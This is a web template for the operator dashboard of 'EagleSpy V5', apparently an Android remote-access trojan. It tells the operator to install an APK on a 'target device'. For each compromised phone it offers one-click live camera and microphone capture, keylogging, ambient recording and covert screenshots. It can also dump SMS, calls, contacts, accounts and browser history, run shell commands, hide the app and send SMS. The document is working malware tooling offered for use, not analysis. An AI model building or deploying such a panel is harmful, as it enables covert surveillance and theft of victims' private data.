<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="csrf-token" content="<%= form_authenticity_token rescue '' %>">
<title>EagleSpy V5</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{font-size:14px}
body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;line-height:1.5;min-height:100vh}
a{color:#00d4ff;text-decoration:none}
.header{background:#111119;border-bottom:1px solid #1e1e2e;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
.header h1{font-size:1.3rem;font-weight:700;color:#fff}
.header h1 span{color:#00d4ff}
.header-right a{font-size:.85rem;padding:6px 14px;border:1px solid #2a2a3a;border-radius:6px;color:#aaa}
.header-right a:hover{color:#00d4ff;border-color:#00d4ff;text-decoration:none}
.container{max-width:1440px;margin:0 auto;padding:20px 24px 40px}
.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:24px}
.stat-card{background:#111119;border:1px solid #1e1e2e;border-radius:10px;padding:16px;text-align:center}
.stat-card .v{font-size:1.8rem;font-weight:700;line-height:1.2}
.stat-card .l{font-size:.7rem;color:#666;text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
.sc1 .v{color:#00d4ff}.sc2 .v{color:#a78bfa}.sc3 .v{color:#34d399}.sc4 .v{color:#fbbf24}.sc5 .v{color:#f87171}.sc6 .v{color:#f472b6}
.dev-title{font-size:1rem;font-weight:600;color:#fff;margin-bottom:14px}
.device-card{background:#111119;border:1px solid #1e1e2e;border-radius:12px;overflow:hidden;margin-bottom:16px}
.dev-hdr{padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #1a1a28}
.dev-name{font-weight:600;color:#fff}
.dev-id{font-size:.72rem;color:#555;font-family:monospace;margin-top:2px}
.dot{width:10px;height:10px;border-radius:50%}
.dot.on{background:#22c55e;box-shadow:0 0 6px #22c55e80}
.dot.off{background:#555}
.dev-body{padding:12px 18px 16px}
.sec{margin-bottom:12px}
.sec:last-child{margin-bottom:0}
.sec-hdr{font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:.7px;color:#555;margin-bottom:6px;display:flex;align-items:center;gap:5px}
.sec[data-s="live"] .sec-hdr{color:#22c55e}
.sec[data-s="capture"] .sec-hdr{color:#f59e0b}
.sec[data-s="data"] .sec-hdr{color:#3b82f6}
.sec[data-s="extract"] .sec-hdr{color:#8b5cf6}
.sec[data-s="control"] .sec-hdr{color:#ef4444}
.sec[data-s="ai"] .sec-hdr{color:#06b6d4}
.bg{display:flex;flex-wrap:wrap;gap:5px}
.cb{display:inline-flex;align-items:center;gap:3px;padding:5px 9px;font-size:.73rem;border-radius:5px;border:1px solid #2a2a3a;background:#0d0d15;color:#bbb;cursor:pointer;font-family:inherit;white-space:nowrap;transition:border-color .15s,color .15s}
.cb:hover{border-color:#00d4ff;color:#00d4ff;text-decoration:none}
.cb.ld{opacity:.4;pointer-events:none}
a.cb{text-decoration:none}
.empty{text-align:center;padding:80px 20px;color:#555}
.empty h2{color:#777;margin-bottom:8px}

/* Output modal */
.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9000;align-items:center;justify-content:center}
.modal-bg.show{display:flex}
.modal{background:#111119;border:1px solid #2a2a3a;border-radius:12px;max-width:700px;width:90%;max-height:80vh;display:flex;flex-direction:column}
.modal-hdr{padding:12px 16px;border-bottom:1px solid #1e1e2e;display:flex;justify-content:space-between;align-items:center}
.modal-hdr h3{font-size:.9rem;color:#fff;margin:0}
.modal-close{background:none;border:none;color:#888;font-size:1.2rem;cursor:pointer}
.modal-close:hover{color:#fff}
.modal-body{padding:14px 16px;overflow-y:auto;font-family:monospace;font-size:.8rem;white-space:pre-wrap;color:#ccc;line-height:1.6}

/* Toast */
.toast-box{position:fixed;top:14px;right:14px;z-index:9999;display:flex;flex-direction:column;gap:6px;pointer-events:none}
.toast{pointer-events:auto;padding:10px 16px;border-radius:7px;font-size:.82rem;color:#fff;max-width:340px;animation:sIn .2s;border:1px solid}
.toast.ok{background:#0f2a1d;border-color:#22c55e50}
.toast.er{background:#2a0f0f;border-color:#ef444450}
.toast.inf{background:#0f1a2a;border-color:#3b82f650}
@keyframes sIn{from{transform:translateX(60px);opacity:0}to{transform:translateX(0);opacity:1}}
@keyframes fOut{from{opacity:1}to{opacity:0}}
@media(max-width:480px){.stats-row{grid-template-columns:repeat(3,1fr)}.container{padding:14px 16px}}
</style>
</head>
<body>

<div class="header">
  <h1>🦅 Eagle<span>Spy</span> V5</h1>
  <div class="header-right"><a href="/dashboard">↻ Refresh</a></div>
</div>

<div class="container">
  <div class="stats-row">
    <div class="stat-card sc1"><div class="v"><%= @stats[:devices] %></div><div class="l">Devices</div></div>
    <div class="stat-card sc2"><div class="v"><%= @stats[:keylogs] %></div><div class="l">Keylogs</div></div>
    <div class="stat-card sc3"><div class="v"><%= @stats[:sms] %></div><div class="l">SMS</div></div>
    <div class="stat-card sc4"><div class="v"><%= @stats[:locations] %></div><div class="l">Locations</div></div>
    <div class="stat-card sc5"><div class="v"><%= @stats[:photos] %></div><div class="l">Photos</div></div>
    <div class="stat-card sc6"><div class="v"><%= @stats[:recordings] %></div><div class="l">Recordings</div></div>
  </div>

<% if @devices.empty? %>
  <div class="empty"><h2>No devices connected</h2><p>Install APK on target device.</p></div>
<% else %>
  <div class="dev-title">Devices (<%= @stats[:devices] %>)</div>
  <% @devices.each do |device| %>
    <% online = device.updated_at && (Time.current - device.updated_at) < 5.minutes %>
    <div class="device-card">
      <div class="dev-hdr">
        <div><div class="dev-name"><%= device.name || "Device" %></div><div class="dev-id"><%= device.device_id %></div></div>
        <div class="dot <%= online ? 'on' : 'off' %>"></div>
      </div>
      <div class="dev-body">

        <div class="sec" data-s="live">
          <div class="sec-hdr">🟢 LIVE</div>
          <div class="bg">
            <button class="cb" data-url="/smartphones/start_webrtc_stream?smartphone_id=<%= device.id %>" data-method="POST">📹 Camera</button>
            <button class="cb" data-url="/smartphones/dump_localtime?smartphone_id=<%= device.id %>" data-method="POST">📍 Location</button>
            <button class="cb" data-url="/smartphones/dump_sysinfo?smartphone_id=<%= device.id %>" data-method="POST">⌨️ Keylogger</button>
            <button class="cb" data-url="/recordings/microphone_rec?smartphone_id=<%= device.id %>&duration=10" data-method="POST">🎙️ Mic</button>
          </div>
        </div>

        <div class="sec" data-s="capture">
          <div class="sec-hdr">📸 CAPTURE</div>
          <div class="bg">
            <button class="cb" data-url="/smartphones/take_picture?smartphone_id=<%= device.id %>" data-method="POST">📷 Photo</button>
            <button class="cb" data-url="/smartphones/front_camera_snap?smartphone_id=<%= device.id %>" data-method="POST">🤳 Front</button>
            <button class="cb" data-url="/screenshots/dump_screen_snap?smartphone_id=<%= device.id %>" data-method="GET">🖥️ Screenshot</button>
            <button class="cb" data-url="/screenshots/screen_record?smartphone_id=<%= device.id %>&duration=30" data-method="POST">⏺️ Screen Rec</button>
            <button class="cb" data-url="/smartphones/ambient_record?smartphone_id=<%= device.id %>&duration=60" data-method="POST">🔊 Ambient</button>
          </div>
        </div>

        <div class="sec" data-s="data">
          <div class="sec-hdr">📂 DATA (dump from device)</div>
          <div class="bg">
            <button class="cb" data-url="/sms_messages/dump_messages?smartphone_id=<%= device.id %>" data-method="POST">💬 Dump SMS</button>
            <button class="cb" data-url="/call_logs/dump_calllogs?smartphone_id=<%= device.id %>" data-method="POST">📞 Dump Calls</button>
            <button class="cb" data-url="/contacts/dump_contacts?smartphone_id=<%= device.id %>" data-method="POST">👤 Dump Contacts</button>
            <button class="cb" data-url="/smartphones/take_picture?smartphone_id=<%= device.id %>" data-method="POST">🖼️ Snap Photo</button>
            <button class="cb" data-url="/screenshots/dump_screen_snap?smartphone_id=<%= device.id %>" data-method="GET">📸 Snap Screen</button>
            <button class="cb" data-url="/geo_locations/dump_location?smartphone_id=<%= device.id %>" data-method="GET">🗺️ Dump Location</button>
            <button class="cb" data-url="/smartphones/browse_files?smartphone_id=<%= device.id %>" data-method="POST">📁 Browse Files</button>
          </div>
        </div>

        <div class="sec" data-s="extract">
          <div class="sec-hdr">⬇️ EXTRACT</div>
          <div class="bg">
            <button class="cb" data-url="/smartphones/dump_device_info?smartphone_id=<%= device.id %>" data-method="POST">📱 Device Info</button>
            <button class="cb" data-url="/smartphones/dump_wifi_info?smartphone_id=<%= device.id %>" data-method="POST">📶 WiFi</button>
            <button class="cb" data-url="/smartphones/get_accounts?smartphone_id=<%= device.id %>" data-method="POST">👥 Accounts</button>
            <button class="cb" data-url="/smartphones/get_app_usage?smartphone_id=<%= device.id %>" data-method="POST">📊 App Usage</button>
            <button class="cb" data-url="/smartphones/get_browser_history?smartphone_id=<%= device.id %>" data-method="POST">🌐 Browser</button>
            <button class="cb" data-url="/smartphones/dump_sysinfo?smartphone_id=<%= device.id %>" data-method="POST">🔧 Sysinfo</button>
          </div>
        </div>

        <div class="sec" data-s="control">
          <div class="sec-hdr">🎮 CONTROL</div>
          <div class="bg">
            <button class="cb" data-url="/smartphones/run_shell_command?smartphone_id=<%= device.id %>&command=id" data-method="POST">💻 Shell</button>
            <button class="cb" data-url="/smartphones/list_apps?smartphone_id=<%= device.id %>" data-method="POST">📋 Apps</button>
            <button class="cb" data-url="/smartphones/hide_app?smartphone_id=<%= device.id %>" data-method="GET">🙈 Hide</button>
            <button class="cb" data-url="/smartphones/show_app?smartphone_id=<%= device.id %>" data-method="GET">👁️ Show</button>
            <button class="cb" data-url="/smartphones/toggle_wifi?smartphone_id=<%= device.id %>" data-method="POST">📶 WiFi</button>
            <button class="cb" data-url="/smartphones/wake_lock?smartphone_id=<%= device.id %>" data-method="POST">🔒 Wake</button>
            <button class="cb" data-url="/smartphones/set_audio_mode?smartphone_id=<%= device.id %>&mode=silent" data-method="POST">🔇 Silent</button>
            <button class="cb" data-url="/sms_messages/send_sms?smartphone_id=<%= device.id %>&to=0000&body=test" data-method="POST">📤 SMS</button>
          </div>
        </div>

        <div class="sec" data-s="ai">
          <div class="sec-hdr">🤖 AI</div>
          <div class="bg">
            <button class="cb" data-url="/api/ai/chat" data-method="POST" data-body='{"message":"Analyze device <%= device.device_id %>"}'>💬 Chat</button>
            <button class="cb" data-url="/api/ai/reports/generate" data-method="POST" data-body='{"device_id":"<%= device.device_id %>"}'>📊 Report</button>
          </div>
        </div>

      </div>
    </div>
  <% end %>
<% end %>
</div>

<!-- Output Modal -->
<div class="modal-bg" id="modal">
  <div class="modal">
    <div class="modal-hdr"><h3 id="modal-title">Output</h3><button class="modal-close" onclick="closeModal()">✕</button></div>
    <div class="modal-body" id="modal-body"></div>
  </div>
</div>

<div class="toast-box" id="toasts"></div>

<script>
(function(){
  var csrf = document.querySelector('meta[name="csrf-token"]');
  var token = csrf ? csrf.content : '';

  function toast(msg, cls) {
    var el = document.createElement('div');
    el.className = 'toast ' + (cls||'inf');
    el.textContent = msg;
    document.getElementById('toasts').appendChild(el);
    setTimeout(function(){ el.style.animation='fOut .3s forwards'; setTimeout(function(){el.remove()},300); }, 3000);
  }

  window.closeModal = function() {
    document.getElementById('modal').classList.remove('show');
  };
  document.getElementById('modal').addEventListener('click', function(e) {
    if (e.target === this) closeModal();
  });

  function showOutput(title, text) {
    document.getElementById('modal-title').textContent = title;
    document.getElementById('modal-body').textContent = text;
    document.getElementById('modal').classList.add('show');
  }

  function extractOutput(jsText) {
    // JS templates have: var commandOutput = "..."; or var commandOutput = {...};
    var m = jsText.match(/var\s+commandOutput\s*=\s*([\s\S]*?)\s*;\s*\$/);
    if (m) {
      try { return JSON.parse(m[1]); } catch(e) { return m[1]; }
    }
    return jsText;
  }

  document.addEventListener('click', function(e) {
    var btn = e.target.closest('button.cb');
    if (!btn) return;
    var url = btn.getAttribute('data-url');
    var method = btn.getAttribute('data-method') || 'POST';
    if (!url) return;

    var label = btn.textContent.trim();
    btn.classList.add('ld');

    var headers = {'Accept': 'text/javascript, application/json, text/html, */*'};
    if (token) headers['X-CSRF-Token'] = token;

    var opts = {method: method, headers: headers};
    var body = btn.getAttribute('data-body');
    if (body) {
      headers['Content-Type'] = 'application/json';
      opts.body = body;
    }

    toast('⏳ ' + label + '...', 'inf');

    var ac = new AbortController();
    var to = setTimeout(function(){ ac.abort(); }, 60000);
    opts.signal = ac.signal;

    fetch(url, opts)
      .then(function(r) {
        var ct = r.headers.get('content-type') || '';
        if (!r.ok) { toast('✗ ' + label + ' — ' + r.status, 'er'); return; }
        return r.text().then(function(txt) {
          if (ct.indexOf('javascript') >= 0) {
            var out = extractOutput(txt);
            if (typeof out === 'object') out = JSON.stringify(out, null, 2);
            if (out && out.length > 80) {
              showOutput(label, out);
            } else {
              toast('✓ ' + label + ': ' + (out || 'OK'), 'ok');
            }
          } else if (ct.indexOf('json') >= 0) {
            try {
              var j = JSON.parse(txt);
              showOutput(label, JSON.stringify(j, null, 2));
            } catch(e) { toast('✓ ' + label, 'ok'); }
          } else if (ct.indexOf('html') >= 0 && txt.indexOf('sign_in') >= 0) {
            toast('✗ ' + label + ' — auth redirect (reload page)', 'er');
          } else {
            toast('✓ ' + label + ' sent', 'ok');
          }
        });
      })
      .catch(function(e){ toast('✗ ' + label + ' — ' + (e.name === 'AbortError' ? 'timeout (60s)' : 'network error'), 'er'); })
      .finally(function(){ clearTimeout(to); btn.classList.remove('ld'); });
  });

  // Escape to close modal
  document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });
})();
</script>
</body>
</html>
